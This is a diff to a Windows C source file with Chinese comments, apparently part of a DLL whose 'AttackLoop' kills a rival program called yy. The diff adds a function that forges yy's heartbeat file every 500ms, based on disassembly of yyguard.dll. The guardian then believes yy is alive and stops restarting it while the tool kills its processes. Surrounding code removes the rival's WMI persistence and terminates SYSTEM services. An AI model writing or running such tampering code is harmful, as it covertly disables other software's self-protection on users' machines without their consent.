@@ -341,6 +341,66 @@ static void RemoveEnemyWmi(void)
     if (n) WriteKillLog(L"已删除对手 WMI 复活订阅 %d 个对象（Binding/Consumer/Filter 三件套）", n);
 }
 
+/* ================== 心跳文件伪造：骗过 yyguard 的"存活判定" ==================
+   反汇编实证（yyguard.dll 0x180001650~0x180001750）：
+     CreateFileW(<yy 目录>\yy_hb.tmp, GENERIC_READ, share=3, OPEN_EXISTING)
+     → ReadFile(h, &dwTick, 4) → CloseHandle
+     → GetTickCount() - dwTick  >  0xFA0(4000ms)  ?  认为 yy 已死并拉起新的 yy.exe
+                                                  :  认为还活着，跳过
+   而 yy.exe 侧（0x14000807e~0x140008138）是：
+     GetTickCount() → 距上次 ≥1000ms 才 CreateFileW(GENERIC_WRITE, CREATE_ALWAYS)
+     → WriteFile(4 字节 tick) → CloseHandle
+   也就是说：**心跳文件里只有 4 字节 GetTickCount**，新鲜度 <4s 就算存活。
+   那我们只要替它"续命"（每 500ms 写一次新 tick），yyguard 就会一直认为 yy 活着，
+   不再拉起新实例 —— 这时候把 yy 全杀掉，它也不会被补回来。 */
+static void SpoofEnemyHeartbeat(void)
+{
+    HANDLE hSnap;
+    PROCESSENTRY32W pe;
+    int done = 0;
+
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+    memset(&pe, 0, sizeof(pe));
+    pe.dwSize = sizeof(pe);
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            WCHAR img[MAX_PATH] = L"";
+            DWORD cch = MAX_PATH;
+            HANDLE hProc, hFile;
+            DWORD tick = GetTickCount(), wrote = 0;
+
+            if (done >= 3) break;                       /* 最多处理 3 个目录 */
+            if (!IsTargetName(pe.szExeFile)) continue;
+
+            hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
+            if (!hProc) continue;
+            if (!QueryFullProcessImageNameW(hProc, 0, img, &cch)) { CloseHandle(hProc); continue; }
+            CloseHandle(hProc);
+
+            {
+                WCHAR *slash = wcsrchr(img, L'\\');
+                if (!slash) continue;
+                *(slash + 1) = L'\0';                    /* 只留目录 */
+                if (wcslen(img) + 14 >= MAX_PATH) continue;
+                wcscat_s(img, MAX_PATH, L"yy_hb.tmp");
+            }
+
+            /* 只带写权限、共享读：yy.exe 自己的 CREATE_ALWAYS 会失败，改由我们续命 */
+            hFile = CreateFileW(img, GENERIC_WRITE, FILE_SHARE_READ, NULL,
+                                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) continue;
+            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+            if (WriteFile(hFile, &tick, sizeof(tick), &wrote, NULL) && wrote == sizeof(tick)) {
+                if (done == 0)
+                    WriteKillLog(L"已开始伪造心跳: %ls（yyguard 会认为 yy 存活）", img);
+                done++;
+            }
+            CloseHandle(hFile);
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+}
 /* ================== WMI 兜底杀：Win32_Process.Terminate ==================
    日志实证：yy 有一部分进程（它自己放的 yysvc.exe，注册成服务跑在 SYSTEM）
    对我们的 TerminateProcess 一律 err=5 —— 普通管理员令牌打不开 SYSTEM 进程。
@@ -2508,6 +2568,7 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
            2 秒一次足够"xx 死了仍然有攻击者在干活"，又不会把机器拖垮。 */
     const DWORD dwIdle = HostIsXxExe() ? 40 : 2000;
     DWORD dwHuntTick = 0;   /* T0/T1/T2 三层识别：慢频（30s），不占攻击循环预算 */
+    DWORD dwHbTick = 0;     /* 心跳伪造：500ms 一次 */
     DWORD dwCopyTick = 0;
 
     while (g_bRunning)
@@ -2523,6 +2584,11 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
             if (dwHuntTick == 0 || now - dwHuntTick >= 30000) {
                 dwHuntTick = now;
                 HuntPass();
+            }
+            /* 心跳伪造：500ms 一次，让 yyguard 一直认为 yy 还活着 */
+            if (dwHbTick == 0 || now - dwHbTick >= 500) {
+                dwHbTick = now;
+                SpoofEnemyHeartbeat();
             }
         }
         if (!hLead)
@@ -2590,6 +2656,8 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     }
     return TRUE;
 }
+
+
 
 
 
